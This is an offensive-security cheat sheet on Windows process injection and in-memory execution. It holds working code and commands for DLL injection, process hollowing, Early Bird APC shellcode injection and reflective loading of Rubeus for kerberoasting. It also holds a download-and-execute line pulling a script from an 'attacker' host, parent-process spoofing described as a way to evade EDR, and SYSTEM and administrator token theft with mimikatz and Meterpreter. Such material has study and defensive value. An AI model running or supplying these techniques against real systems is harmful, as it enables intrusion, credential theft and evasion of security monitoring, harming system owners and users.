# Process Injection & In-Memory Execution

## Classic DLL Injection

```powershell
# Target: inject into running process (e.g. notepad)
$proc = Get-Process -Name notepad
$handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
$addr   = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x40)
[Win32.Kernel32]::WriteProcessMemory($handle, $addr, [Text.Encoding]::Default.GetBytes($dllPath), $dllPath.Length, [ref]0)
$loadLib = [Win32.Kernel32]::GetProcAddress([Win32.Kernel32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
[Win32.Kernel32]::CreateRemoteThread($handle, 0, 0, $loadLib, $addr, 0, [ref]0)
```

---

## Process Hollowing (Runpe)

```
1. CreateProcess("C:\Windows\System32\svchost.exe", CREATE_SUSPENDED)
2. NtUnmapViewOfSection(hProcess, pBaseAddress)   — hollow out legit image
3. VirtualAllocEx at same base address
4. WriteProcessMemory — write malicious PE
5. SetThreadContext — fix entry point in CONTEXT
6. ResumeThread
```
Tools: `pe-sieve` for detection; Cobalt Strike `spawn` uses this pattern.

---

## APC Queue Injection (Early Bird)

```csharp
// Early Bird variant — inject before thread's first instruction
IntPtr hProc   = CreateProcess(..., CREATE_SUSPENDED);
IntPtr hThread = hProc.hThread;
IntPtr allocMem = VirtualAllocEx(hProc, shellcodeSize, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, allocMem, shellcode);
QueueUserAPC(allocMem, hThread, 0);   // queued before any code runs
ResumeThread(hThread);                 // shellcode executes first
```

---

## CLR Injection / Execute-Assembly (fileless .NET)

```powershell
# Reflective load — execute .NET assembly from memory, never touch disk
$bytes = [System.IO.File]::ReadAllBytes("C:\temp\Rubeus.exe")
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @(,@("kerberoast", "/format:hashcat")))

# Cobalt Strike in-beacon execution (no new process)
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /format:hashcat

# PowerSharpPack — many tools bundled as compressed base64
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerSharpPack.ps1")
Invoke-Rubeus -Command "kerberoast /format:hashcat"
```

**Advantage**: assembly runs in current process context, no new process spawn, no on-disk artifact.

---

## PPID Spoofing (parent process faking)

```powershell
# Spawn process with spoofed parent (e.g. appear as child of explorer)
$parent = Get-Process -Name explorer | Select-Object -First 1
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "cmd.exe"
$psi.UseShellExecute = $false

# Via Win32 API: UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
# Tools: PPLdump, Cobalt Strike: ppid [PID]
```

```
# Cobalt Strike
beacon> ppid 4832        # set explorer.exe PID as parent
beacon> run cmd.exe      # cmd.exe now appears as child of explorer
```

**Why**: EDR correlates spawned process with parent — `cmd.exe` from `Word.exe` triggers alert; from `explorer.exe` does not.

---

## Token Impersonation

```
mimikatz # token::elevate          -- steal SYSTEM token
mimikatz # token::list             -- list available tokens
mimikatz # token::impersonate /user:DOMAIN\admin
```

```powershell
# Incognito (Meterpreter module)
use incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
```
